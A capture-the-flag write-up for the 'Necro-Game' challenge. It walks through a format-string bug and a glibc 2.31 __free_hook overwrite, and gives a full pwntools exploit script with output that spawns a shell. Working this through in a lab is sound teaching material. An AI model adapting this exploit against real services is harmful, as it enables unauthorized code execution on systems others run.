# Necro-Game — Pwn Writeup
## Author : afk-Yato 


## Overview

| | |
|---|---|
| **Challenge** | Necro-Game (Dark Arts menu) |
| **Category** | Pwn / Format String |
| **Binary** | `chall` — ELF 64-bit, PIE, not stripped |
| **Libc** | glibc 2.31 (Ubuntu 20.04, bundled in `libs/`) |
| **Flag** | `flag{y0u_4r3_4_r34l_n3cr0m4nc3r}` |

```
$ checksec chall
    PIE      : YES
    RELRO    : FULL
    NX       : ENABLED
    Canary   : YES
```

## The Program

A necromancy-themed menu (`main` @ `0x13ac`):

```
=== Dark Arts Menu ===
1. Bind a Soul
2. Inscribe Ritual
3. Release Soul
4. Exit
```

Reversing the handlers (offsets from the non-stripped binary):

* **`bind`** (`0x12bf`) — `soul = malloc(0x100);` where `soul` is a global pointer stored in `.bss` at **PIE + 0x4050**.
* **`ritual`** (`0x12e7`) — reads `0x200` bytes into a stack buffer at `rbp-0x210`, then calls **`printf(buf)` with no format string**. This is the bug.
* **`release`** (`0x1361`) — `free(soul)` (with a NULL check).

The Dockerfile confirms Ubuntu 20.04 + `gcc -z relro -z now -O0`, i.e. glibc **2.31** — the last glibc where `__free_hook` still exists.

## The Bug

```c
read(0, buf, 0x200);
puts("The ritual echoes...");
printf(buf);        // <-- format string vulnerability
```

Full read-back of what we send, and a format string that can both **leak** and **write arbitrary memory**. The buffer is 0x210 bytes with 0x200 read, so payloads up to ~0x200 bytes fit comfortably (`fmtstr_payload` with `write_size='byte'` produces ~104–120 byte payloads).

## Exploit Strategy

Classic glibc 2.31 `__free_hook` takeover:

1. **Bind a soul** (so `soul != NULL` and `release` will call `free` on it).
2. **Leak libc + PIE** with one ritual: `"%p%40$p"`
   * First `%p` leaks a leftover register value that is always `libc_base + 0x1ed723` — this is the low byte of the `_IO_2_1_stdout_` shortbuf pointer (`stdout + 0x83`, `_IO_2_1_stdout_` = libc + `0x1ed6a0`). It survives in a callee-saved register from the preceding `puts("The ritual echoes...")`.
   * `%40$p` lands on a saved stack value pointing into the binary: `PIE_base + 0x1160` = `_start`.
3. **Overwrite `__free_hook` with `system`** using a byte-wise `fmtstr_payload(6, {free_hook: system})` (format-arg offset **6**, since the buffer is the 6th vararg on the stack after `rdi`=fmt, `rsi..r9`, then stack).
4. **Overwrite the `soul` global itself** with the address of the `"/bin/sh"` string in libc — `fmtstr_payload(6, {soul_global: binsh})`. This is the neat trick of this challenge: instead of writing `"/bin/sh"` *into* the heap chunk, we repoint the `soul` pointer so that:
   * `release()` does `free(soul)` → `free(&"/bin/sh")`
   * → `__free_hook(&"/bin/sh")` → `system("/bin/sh")`.
5. **Release the soul** → shell.

### Offsets used (verified against the bundled `libc-2.31.so`)

```
system        = libc + 0x52290
__free_hook   = libc + 0x1eee48
"/bin/sh"     = libc + 0x1b45bd
stdout leak   = libc + 0x1ed723   (leaked value minus this = libc base)
PIE leak      = pie  + 0x1160     (leaked value minus this = PIE base)
soul (global) = pie  + 0x4050
```

## Final Exploit

```python
from pwn import *
context.arch = 'amd64'

p = process("./chall", env={})

def bind():
    p.recvuntil(b"4. Exit"); p.sendline(b"1")

def ritual(spell):
    p.recvuntil(b"4. Exit"); p.sendline(b"2")
    p.recvuntil(b"ritual:"); p.send(spell)

def release():
    p.recvuntil(b"4. Exit"); p.sendline(b"3")

bind()

# ---- Stage 1: leaks ----
ritual(b"%p%40$p")
p.recvuntil(b"0x"); leak      = int(p.recvn(12), 16)   # libc + 0x1ed723
p.recvuntil(b"0x"); code_leak = int(p.recvn(12), 16)  # pie   + 0x1160

pie_base  = code_leak - 0x1160
libc      = leak - 0x1ed723
free_hook = libc + 0x1eee48
system    = libc + 0x52290
sh        = libc + 0x1b45bd
soul      = pie_base + 0x4050

log.info(f"libc base   : {hex(libc)}")
log.info(f"pie base    : {hex(pie_base)}")

# ---- Stage 2: __free_hook = system ----
ritual(fmtstr_payload(6, {free_hook: system}, write_size='byte'))

# ---- Stage 3: soul global = &"/bin/sh" ----
ritual(fmtstr_payload(6, {soul: sh}, write_size='byte'))

# ---- Stage 4: free("/bin/sh") -> system("/bin/sh") ----
release()

p.interactive()
```

```
$ python3 exploit.py
[+] libc base : 0x7f442c9a7000
[+] pie base  : 0x5643d8957000
💀 Releasing the soul...
$ cat flag.txt
flag{y0u_4r3_4_r34l_n3cr0m4nc3r}
```

## Notes / Takeaways

* glibc **2.31 is the target**: `__free_hook` was removed in 2.34, so this challenge pins the last "easy" hook-overwrite era. With Full RELRO the GOT is out of reach — hooks are the way.
* Overwriting the **pointer variable** (`soul`) instead of the pointee is cleaner than writing `"/bin/sh"` into the chunk: one 8-byte write with `fmtstr_payload`, and `free()` itself becomes `system("/bin/sh")`.
* The `%p` leak relies on a stale register value (`stdout+0x83`) left behind by the previous `puts` call — always check what's lying around in registers at your format-string call site; `ltrace`/gdb makes this obvious.
* `write_size='byte'` keeps the `%hhn`-style payload short (104–120 bytes) so it fits the 0x200 read.
